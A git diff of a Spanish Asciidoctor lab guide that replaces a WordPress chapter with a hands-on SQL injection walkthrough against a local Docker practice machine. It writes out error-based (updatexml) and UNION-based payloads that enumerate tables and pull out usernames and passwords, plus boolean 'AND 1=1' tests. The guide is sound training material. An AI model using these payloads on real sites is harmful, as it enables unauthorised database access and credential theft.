@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="generator" content="Asciidoctor 2.0.23">
 <meta name="author" content="Manuel L. Quero">
-<title>Pereza</title>
+<title>Avaricia</title>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
 <style>
 /*! Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
@@ -437,29 +437,36 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </head>
 <body class="book toc2 toc-left">
 <div id="header">
-<h1>Pereza</h1>
+<h1>Avaricia</h1>
 <div class="details">
 <span id="author" class="author">Manuel L. Quero</span><br>
-<span id="revdate">2025-04-13</span>
 </div>
 <div id="toc" class="toc2">
 <div id="toctitle">Table of Contents</div>
 <ul class="sectlevel1">
-<li><a href="#_wordpress_y_sus_vulnerabilidades">WordPress y sus vulnerabilidades</a>
+<li><a href="#_ataque_sql_injection_sqli">Ataque SQL Injection (SQLi)</a>
 <ul class="sectlevel2">
-<li><a href="#_vulnerabilidades_comunes_en_wordpress">Vulnerabilidades comunes en WordPress</a></li>
-<li><a href="#_ataques_frecuentes">Ataques frecuentes</a></li>
+<li><a href="#_1_in_band_sql_injection">1. In-band SQL injection</a></li>
+<li><a href="#_2_blind_sql_injection">2. Blind SQL Injection</a></li>
+<li><a href="#_3_out_of_band_sql_injection_oob_sqli">3. Out-of-band SQL injection (OOB SQLi)</a></li>
 </ul>
 </li>
 <li><a href="#_solucionar_la_máquina">Solucionar la máquina</a>
 <ul class="sectlevel2">
 <li><a href="#_despliegue_de_la_máquina">Despliegue de la máquina</a></li>
-<li><a href="#_wpscan">WPscan</a></li>
+<li><a href="#_1_in_band_sql_injection_2">1. In-band SQL injection</a></li>
+<li><a href="#_2_blind_sql_injection_2">2. Blind SQL Injection</a></li>
+<li><a href="#_3_out_of_band_sql_injection_oob_sqli_2">3. Out-of-band SQL injection (OOB SQLi)</a></li>
 </ul>
 </li>
 <li><a href="#_cómo_prevenir">¿Cómo prevenir?</a>
 <ul class="sectlevel2">
-<li><a href="#_wordpress">WordPress</a></li>
+<li><a href="#_1_parametrizar">1. Parametrizar</a></li>
+<li><a href="#_2_procedimientos_almacenados">2. Procedimientos almacenados</a></li>
+<li><a href="#_3_validación_contra_valores_permitidos">3. Validación contra valores permitidos</a></li>
+<li><a href="#_4_escapar_todas_las_entradas_de_usuario">4. Escapar todas las entradas de usuario</a></li>
+<li><a href="#_5_aplicar_el_mínimo_privilegio">5. Aplicar el mínimo privilegio:</a></li>
+<li><a href="#_6_web_application_firewall_waf">6. Web Application Firewall (WAF)</a></li>
 </ul>
 </li>
 </ul>
@@ -472,56 +479,95 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </div>
 </div>
 <div class="sect1">
-<h2 id="_wordpress_y_sus_vulnerabilidades">WordPress y sus vulnerabilidades</h2>
+<h2 id="_ataque_sql_injection_sqli">Ataque SQL Injection (SQLi)</h2>
 <div class="sectionbody">
 <div class="paragraph">
-<p>WordPress es un sistema de gestión de contenidos (CMS) gratuito y de código abierto que permite a cualquier persona crear y administrar sitios web con facilidad. Originalmente concebido como una plataforma de blogs en 2003, ha evolucionado hasta convertirse en una de las herramientas más versátiles para desarrollar desde simples sitios personales hasta complejas tiendas de comercio electrónico.</p>
-</div>
-<div class="paragraph">
-<p>Sin embargo, su enorme popularidad (más del 40% de los sitios web del mundo utilizan WordPress) lo convierte en un blanco constante para ciberdelincuentes. Esta popularidad, sumada a una comunidad diversa de desarrolladores de plugins y temas, ha generado un entorno en el que las configuraciones por defecto, credenciales débiles, plugins vulnerables o versiones sin actualizar pueden dejar expuesto un sitio web con facilidad.</p>
-</div>
-<div class="sect2">
-<h3 id="_vulnerabilidades_comunes_en_wordpress">Vulnerabilidades comunes en WordPress</h3>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>Uso de credenciales por defecto o débiles</strong> &#8594; Muchos administradores dejan el nombre de usuario “admin” y contraseñas como “admin123” o “password”, facilitando ataques de fuerza bruta.</p>
-</li>
-<li>
-<p><strong>Plugins y temas vulnerables</strong> &#8594; WordPress permite ampliar su funcionalidad con plugins, muchos de los cuales son desarrollados por terceros. Cuando no se actualizan con frecuencia o tienen malas prácticas de seguridad, pueden introducir fallos críticos.</p>
-</li>
-<li>
-<p><strong>Versiones desactualizadas del núcleo de WordPress</strong> &#8594; Al no aplicar parches de seguridad, se dejan abiertas puertas ya conocidas y documentadas.</p>
-</li>
-<li>
-<p><strong>Configuraciones por defecto</strong> &#8594; Instalaciones que dejan habilitado el acceso público a /wp-admin o la API REST sin restricciones pueden ser explotadas para enumerar usuarios o realizar ataques automatizados.</p>
-</li>
-</ul>
-</div>
-</div>
-<div class="sect2">
-<h3 id="_ataques_frecuentes">Ataques frecuentes</h3>
-<div class="paragraph">
-<p>Entre los ataques más comunes se encuentran:</p>
+<p>Los ataques de inyección SQL se basan en la manipulación de bases de datos SQL mediante la inserción de consultas maliciosas en campos de entrada. Esto permite a un atacante alterar datos, acceder a información confidencial y realizar acciones no autorizadas. Un usuario malintencionado podría:</p>
 </div>
 <div class="ulist">
 <ul>
 <li>
-<p>Fuerza bruta contra el panel de login</p>
+<p>Suplantar la identidad de otro usuario con más privilegios.</p>
 </li>
 <li>
-<p>Cross-Site Scripting (XSS)</p>
+<p>Elevar sus propios permisos o los de otros hasta niveles administrativos.</p>
 </li>
 <li>
-<p>Inyecciones SQL (especialmente en plugins mal desarrollados)</p>
+<p>Manipular datos existentes o eliminarlos.</p>
 </li>
 <li>
-<p>Carga de archivos maliciosos</p>
-</li>
-<li>
-<p>Escalada de privilegios a través de bugs en extensiones</p>
+<p>Obtener acceso a información sensible almacenada en la base de datos.</p>
 </li>
 </ul>
+</div>
+<div class="paragraph">
+<p>Existen tres grandes grupos de ataques SQLi:</p>
+</div>
+<div class="sect2">
+<h3 id="_1_in_band_sql_injection">1. In-band SQL injection</h3>
+<div class="paragraph">
+<p>Este es el tipo de ataque SQLi más clásico y directo. Se caracteriza porque el atacante envía consultas SQL maliciosas y recibe los resultados por el mismo canal de comunicación, generalmente como una respuesta de la base de datos en una página web.</p>
+</div>
+<div class="paragraph">
+<p>Dentro de este grupo encontramos dos subtipos:</p>
+</div>
+<div class="sect3">
+<h4 id="_a_error_based_sql_injection">a. Error-based SQL injection</h4>
+<div class="paragraph">
+<p>Este ataque explota los mensajes de error devueltos por la base de datos para obtener información sensible. Aunque estos errores pueden parecer inofensivos, un atacante puede utilizarlos para:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Obtener la versión de la base de datos y poder usar ataques específicos dependiendo de la versión.</p>
+</li>
+<li>
+<p>Conocer la estructura de la base de datos para poder intentar SQLi más específicas.</p>
+</li>
+<li>
+<p>Extraer datos de la base de datos. El proceso es más largo y complejo pero se pueden manipular los errores para extraer datos.</p>
+</li>
+</ul>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_b_union_based_sql_injection">b. Union-based SQL injection</h4>
+<div class="paragraph">
+<p>Este ataque utiliza la cláusula <strong>UNION</strong> para combinar en una misma consulta información legítima con datos sensibles. Es un método especialmente peligroso, ya que permite al atacante recuperar casi cualquier dato almacenado en la base de datos con una única consulta.</p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_2_blind_sql_injection">2. Blind SQL Injection</h3>
+<div class="paragraph">
+<p>Las inyecciones SQL a ciegas son una variante en la que el atacante no recibe respuestas directas de la base de datos. En lugar de obtener mensajes de error o resultados visibles, debe inferir la información mediante observación indirecta.</p>
+</div>
+<div class="paragraph">
+<p>Este tipo de ataques funciona como un sistema de "verdadero o falso", donde el atacante prueba diferentes consultas y analiza los cambios en el comportamiento del sistema.</p>
+</div>
+<div class="paragraph">
+<p>Si quieres saber más sobre este tipo de ataques puedes mirar &#8594; <a href="https://www.exploit-db.com/docs/47367">Inyección SQL a ciegas</a></p>
+</div>
+<div class="paragraph">
+<p>Dentro de este grupo encontramos dos subtipos:</p>
+</div>
+<div class="sect3">
+<h4 id="_a_boolean_based_sql_injection">a. Boolean-Based SQL Injection</h4>
+<div class="paragraph">
+<p>En este ataque, el atacante inyecta una condición que evalúa si es <strong>TRUE</strong> o <strong>FALSE</strong>, observando las diferencias en la respuesta del servidor. Normalmente, se utiliza la cláusula <strong>AND</strong> para construir estas pruebas.</p>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_b_time_based_sql_injection">b. Time-based SQL Injection</h4>
+<div class="paragraph">
+<p>En este caso, el ataque se basa en utilizar funciones como <strong>SLEEP()</strong> o <strong>BENCHMARK()</strong> para medir los tiempos de respuesta y determinar si una consulta se ejecutó correctamente.</p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_3_out_of_band_sql_injection_oob_sqli">3. Out-of-band SQL injection (OOB SQLi)</h3>
+<div class="paragraph">
+<p>El ataque de SQL fuera de banda consiste en enviar la información consultada a través de un canal diferente al utilizado para la interacción con la aplicación. El atacante usa comandos SQL para que envíen información a través de una conexión de red directa, una solicitud DNS o una solicitud HTTP</p>
 </div>
 <div style="page-break-after: always;"></div>
 </div>
@@ -531,7 +577,7 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <h2 id="_solucionar_la_máquina">Solucionar la máquina</h2>
 <div class="sectionbody">
 <div class="paragraph">
-<p>En esta guía aprenderemos cómo analizar un sitio web desarrollado con WordPress para identificar posibles vulnerabilidades. Utilizaremos herramientas como WPScan para detectar configuraciones inseguras, plugins o temas desactualizados y otros puntos débiles comunes. Después se realizará un ataque de fuerza bruta como parte del reconocimiento activo, pero su explicación detallada se abordará en la sección correspondiente al círculo de la ira.</p>
+<p>Vamos a ver cómo realizar los diversos tipos de ataques de inyección SQL que hemos visto anteriormente y ver las respuestas que nos dan, además de entender las consultas que realizamos.</p>
 </div>
 <div class="paragraph">
 <p>Sería conveniente utilizar una distribución Linux, es recomendable usar Kali Linux.</p>
@@ -548,483 +594,924 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <p>Podemos ver como instalar docker-compose para varias distribuciones de linux &#8594; <a href="https://docs.docker.com/compose/install/linux/">Instalar Docker-Compose</a></p>
 </div>
 <div class="paragraph">
-<p>Necesitaremos descargar primeramente el auto_deploy.sh, el cual se muestra como una pirámide en la página. Después en un directorio deberemos tener el auto_deploy.sh, pereza.tar y docker-compose.yml, deberemos acceder con la terminal a dicho directorio y ejecutar el siguiente comando.</p>
+<p>Necesitaremos descargar primeramente el auto_deploy.sh, el cual se muestra como una pirámide en la página. Después en un directorio deberemos tener el auto_deploy.sh, avaricia.tar y docker-compose.yml, deberemos acceder con la terminal a dicho directorio y ejecutar el siguiente comando.</p>
 </div>
 <div class="paragraph">
 <p>(Si el auto_deploy no tiene permisos se los damos mediante <strong>chmod +x</strong>).</p>
 </div>
 <div class="listingblock">
 <div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ sudo bash auto_deploy.sh pereza.tar</code></pre>
+<pre class="highlight"><code class="language-bash" data-lang="bash">$ sudo bash auto_deploy.sh avaricia.tar</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>En nuestro caso la base de datos usa Mysql, podemos ver una guía de los distintos payloads para otros servicios de bases de datos &#8594; <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQLiCheatSheet</a>.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_1_in_band_sql_injection_2">1. In-band SQL injection</h3>
+<div class="sect3">
+<h4 id="_a_error_based_sql_injection_2">a. Error-based SQL injection</h4>
+<div class="paragraph">
+<p>Con este ataque, podremos obtener mucha información sobre la base de datos, desde su versión hasta contraseñas.</p>
+</div>
+<div class="sect4">
+<h5 id="_reconocimiento">Reconocimiento</h5>
+<div class="paragraph">
+<p>Pero antes de esto deberemos comprobar si nos muestra los errores o no para ello deberemos hacer la siguiente consulta:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: '
+Contraseña: 1234</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Al poner esa comilla simple, se cierra la consulta que hace la web al servidor de mysql, por lo que el resto sería un error en la sintaxis de sql.</p>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Recon1.png" alt="Reconocimiento1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Recon2.png" alt="Reconocimiento2">
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_payloads">Payloads</h5>
+<div class="paragraph">
+<p>Para cada uno de ellos utilizaremos la clausula updatexml(), que permite modificar datos XML dentro de bases de datos MySQL. En nuestro caso lo usaremos para lanzar los errores y mostrar su contenido como un mensaje.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>UPDATEXML(xml_target, xpath_expr, new_value)</pre>
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Obtener la versión del motor de MySQL</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, @@version), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>'</strong> &#8594; Esto es un carácter de comilla simple que cierra la consulta original y nos permite iniciar la nuestra.</p>
+</li>
+<li>
+<p><strong>AND</strong> &#8594; Añadimos una condición a la consulta original.</p>
+</li>
+<li>
+<p><strong>updatexml()</strong> &#8594; La función intenta procesar una expresión XML, pero si se le pasa un valor que no es válido como XML (en este caso, un valor concatenado con concat), lanzará un error. El contenido que se pase dentro de concat() se convierte en el mensaje de error, lo que permite al atacante obtener información sensible.</p>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>null</strong> &#8594; Sirve para no afectar al ataque.</p>
+</li>
+<li>
+<p><strong>concat(0x3a, @@version)</strong> &#8594; Con esto, concatenaremos varias cadenas, el valor de <em>0x3a</em> en hexadecimal corresponde con el carácter :, que se usará como separador entre los valores concatenados. Y <em>@@version</em> es una variable global en MySQL que devuelve la versión del servidor.</p>
+</li>
+<li>
+<p><strong>null</strong> &#8594; Sirve para no afectar al ataque.</p>
+</li>
+<li>
+<p><strong>--</strong> &#8594; Sirven para que el resto de consulta sea comentado y sea ignorado.</p>
+</li>
+<li>
+<p><strong>'</strong> &#8594; Este carácter es para cerrar la otra comilla simple y que no nos de ningún error, y así se pueda comentar el resto de la consulta correctamente.</p>
+</li>
+</ul>
+</div>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Version1.png" alt="Version1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Version2.png" alt="Version2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Obtener el nombre de la base de datos actual</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, database()), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Como podemos ver la sintaxis es la misma que el anterior pero cambia el contenido del concat().</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>database()</strong> &#8594; Esta es una función de MySQL que devuelve el nombre de la base de datos actual a la que está conectado el servidor MySQL.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/BaseDatos1.png" alt="BaseDatos1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/BaseDatos2.png" alt="BaseDatos2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Obtener el nombre de la primera tabla</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>information_schema.tables</strong> &#8594; <em>information_schema</em> es una base de datos especial en MySQL que contiene información sobre todas las bases de datos y sus tablas. La tabla tables contiene los nombres de todas las tablas de una base de datos.</p>
+</li>
+<li>
+<p><strong>table_schema=database()</strong> &#8594; database() devuelve el nombre de la base de datos actual. Al usar esta función dentro de la consulta, estás buscando las tablas dentro de la base de datos actual.</p>
+</li>
+<li>
+<p><strong>LIMIT 0,1</strong> &#8594; Esto limita los resultados de la consulta a una sola fila. De esta forma obtendremos solo el primer nombre de tabla de la base de datos.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Usuarios1.png" alt="TablaUsuarios1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Usuarios2.png" alt="TablaUsuarios2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Obtener el nombre de la primera columna de una tabla</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' LIMIT 0,1)), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>information_schema.columns</strong> &#8594; Esta tabla contiene información sobre las columnas de todas las tablas de la base de datos. Se puede consultar para obtener detalles sobre las columnas de una tabla específica.</p>
+</li>
+<li>
+<p><strong>table_name='usuarios'</strong> &#8594; Aquí estamos buscando las columnas de la tabla llamada usuarios (que lo podemos obtener de la anterior consulta).</p>
+</li>
+<li>
+<p><strong>LIMIT 0,1</strong> &#8594; Limitamos el resultado a solo una columna para facilitar la consulta y evitar que se devuelvan demasiados resultados.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Colum1.png" alt="Columna1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Colum2.png" alt="Columna2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Extraer usuarios y contraseñas (u otras columnas)</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, (SELECT usuario FROM usuarios LIMIT 0,1)), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Como ya sabemos la tabla y podemos conocer las distintas columnas que tiene, se hace más sencilla la busqueda de información. En este caso, vamos a extraer el nombre del primer usuario.</p>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Nombre1.png" alt="NombreUsuarios1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Nombre2.png" alt="NombreUsuarios2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' AND updatexml(null, concat(0x3a, (SELECT password FROM usuarios LIMIT 0,1)), null) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>También podemos ver las contraseñas si sabes la columna en la que están. Si queremos ver otros datos de la misma columna podemos cambiar el LIMIT a LIMIT(1,1).</p>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Contraseñas1.png" alt="Contraseñas1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/error-based/Contraseñas2.png" alt="Contraseñas2">
+</div>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_b_union_based_sql_injection_2">b. Union-based SQL injection</h4>
+<div class="sect4">
+<h5 id="_reconocimiento_2">Reconocimiento</h5>
+<div class="paragraph">
+<p>Para este tipo de ataques es importante conocer cuantas columnas tiene la consulta original, para que las columnas que inyecta el UNION coincidan.</p>
+</div>
+<div class="paragraph">
+<p>Entonces, podemos usar el payload anterior para obtener el nombre la columna empezando por LIMIT(0,1) hasta que nos de error.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>' AND updatexml(null, concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' LIMIT 0,1)), null) -- '</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>O podemos usar un payload UNION para ir sacando mediante NULL la cantidad de columnas que tiene.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL, NULL,(...) -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Aclarar que los (&#8230;&#8203;) son NULL en caso que la tabla tenga más columnas. Si la tabla tiene seis columnas se deberán añadir dos NULL más al payload.</p>
+</div>
+<div class="paragraph">
+<p>De esta forma, sabremos la estructura de la tabla y podremos incluso acceder, aunque no tengamos datos de nadie todavía. Esto nos permitirá inyectar datos específicos.</p>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Recon1.png" alt="Reconocimiento1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Recon2.png" alt="Reconocimiento2">
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_payloads_2">Payloads</h5>
+<div class="paragraph">
+<p><strong>Recuperar el nombre de la base de datos</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), database() -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Este payload lo que nos mostrará será el nombre de la base de datos en la posición que pongamos database(), es decir, si la tabla tiene seis columnas y en la cuenta se muestran los datos de las tres últimas columnas, tendremos que poner database() en alguna de esas posiciones para obtener los datos, en este caso el nombre de la base de datos.</p>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/BaseDatos1.png" alt="BaseDatos1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/BaseDatos2.png" alt="BaseDatos2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Recuperar el nombre de las tablas</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>group_concat(table_name)</strong> &#8594; Esta función de MySQL concatena todos los nombres de las tablas en la base de datos, obteniendolas separadas por comas.</p>
+</li>
+<li>
+<p><strong>information_schema.tables</strong> &#8594; Esta tabla contiene información sobre todas las tablas en todas las bases de datos en MySQL. La consulta se limita a la base de datos actual utilizando WHERE <strong>table_schema=database()</strong>.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Tablas1.png" alt="NombreTablas1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Tablas2.png" alt="NombreTablas2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Recuperar los nombres de las columnas de una tabla específica</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), group_concat(column_name) FROM information_schema.columns WHERE table_name='usuarios' -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>group_concat(column_name)</strong> &#8594; Similar al paso anterior, esta función concatenará los nombres de las columnas de la tabla usuarios y los devolverá como un solo resultado.</p>
+</li>
+<li>
+<p><strong>information_schema.columns</strong> &#8594; Esta tabla contiene información sobre todas las columnas de todas las tablas en MySQL. Al limitarla por table_name='usuarios', obtenemos los nombres de las columnas de la tabla usuarios.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Columnas1.png" alt="Columnas1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Columnas2.png" alt="Columnas2">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Extraer datos de las columnas (usuarios, contraseñas u otras columnas)</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), group_concat(usuario) FROM usuarios -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>group_concat(usuario)</strong> &#8594; Aquí estamos extrayendo los datos de la columna usuario de la tabla usuarios y concatenándolos para que todos los nombres de usuario sean devueltos en una sola cadena separada por comas.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Usuarios1.png" alt="Usuarios1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Usuarios2.png" alt="Usuarios2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: ' UNION SELECT NULL, NULL, NULL,(...), group_concat(password) FROM usuarios -- '
+Contraseña:</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>group_concat(password)</strong> &#8594; Similar al paso anterior, pero en este caso estamos extrayendo los valores de la columna password de la tabla usuarios.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Contraseñas1.png" alt="Contraseñas1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/in-band/union-based/Contraseñas2.png" alt="Contraseñas2">
+</div>
+</div>
 </div>
 </div>
 </div>
 <div class="sect2">
-<h3 id="_wpscan">WPscan</h3>
-<div class="paragraph">
-<p>WPscan es una herramienta de escaneo de seguridad específica para sitios web construidos con WordPress.</p>
-</div>
+<h3 id="_2_blind_sql_injection_2">2. Blind SQL Injection</h3>
 <div class="sect3">
-<h4 id="_descargar">Descargar</h4>
+<h4 id="_a_boolean_based_sql_injection_2">a. Boolean-Based SQL Injection</h4>
 <div class="paragraph">
-<p>Para descargar esta herramienta viene explicado en su <a href="https://github.com/wpscanteam/wpscan">github</a>.</p>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>Gem</strong> &#8594; Esta es la opción más recomendada en caso de usar Kali Linux.</p>
-</li>
-</ul>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ sudo apt install ruby
-$ sudo apt install build-essential libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev  libgmp-dev zlib1g-dev
-$ gem install wpscan
-$ gem update wpscan</code></pre>
-</div>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>Docker</strong> &#8594; En caso de usar otra distribución podemos descargarla por docker.</p>
-</li>
-</ul>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ docker pull wpscanteam/wpscan
-$ docker run -it --rm wpscanteam/wpscan --url https://target.tld/ --enumerate (...)</code></pre>
-</div>
+<p>En los ataques boolean-based se usan operadores lógicos como AND u OR para alterar las condiciones de una consulta SQL. AND se usa cuando se conoce una condición válida (como un usuario) y se quiere comprobar si otra también lo es, por ejemplo 1=1. OR, en cambio, permite que la consulta sea verdadera si al menos una condición se cumple, como usuario = 'admin' OR 1=1, forzando así una respuesta positiva.</p>
 </div>
 <div class="paragraph">
-<p>En caso de usar distribuciones más extrañas puedes <a href="https://www.linuxbabe.com/security/install-wpscan-wp-vulnerability-scanner">ver esto</a>.</p>
-</div>
-<div class="paragraph">
-<p>WPscan es gratis pero mejora con la API, en caso que queramos hacer escaneos más exhaustivos &#8594; <a href="https://wpscan.com/pricing/">ver aquí</a>.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_reconocimiento">Reconocimiento</h4>
-<div class="paragraph">
-<p>Una vez instalada nuestra herramienta, vamos a proceder a analizar la página.</p>
-</div>
-<div class="paragraph">
-<p>Es importante saber que el login de WordPress está en /wp-admin. También esta /robots.txt que nos puede proporcionar información adicional.</p>
+<p>En nuestro caso, vamos a usar AND ya que con los anteriores resultado sabemos que existe el usuario <strong>admin</strong> y <strong>user</strong>. En caso de que no conozcamos estos datos se recomienda usar OR.</p>
 </div>
 <div class="sect4">
-<h5 id="_1_reconocimiento_general">1. Reconocimiento general</h5>
+<h5 id="_reconocimiento_3">Reconocimiento</h5>
 <div class="paragraph">
-<p>Comenzamos realizando un escaneo general, principalmente para comprender cómo es la estructura, ver las cabeceras, ver si tiene XML-RPC, ver la versión de WordPress, y entre otras cosas que vamos a ver a continuación.</p>
+<p>Ahora valuaremos si la página es vulnerable a este tipo de ataques, la lógica de esta página es que si es verdad nos dejará acceder, si es falso nos dirá que las credenciales son incorrectas. A este tipo de ataques se les suele hacer un script para automatizar la iteración y obtener respuestas para cosas más específicas.</p>
 </div>
 <div class="listingblock">
 <div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ wpscan --url http://localhost:8080</code></pre>
+<pre>Usuario: admin' AND 1=1 --
+Contraseña:</pre>
 </div>
 </div>
-<details>
-<summary class="title">WPscan General</summary>
+<div class="imageblock text-center">
 <div class="content">
-<div class="listingblock">
+<img src="assets/blind/boolean-based/Recon1.png" alt="Reconocimiento1">
+</div>
+</div>
+<div class="imageblock text-center">
 <div class="content">
-<pre class="highlight"><code class="language-text" data-lang="text">_______________________________________________________________
-         __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
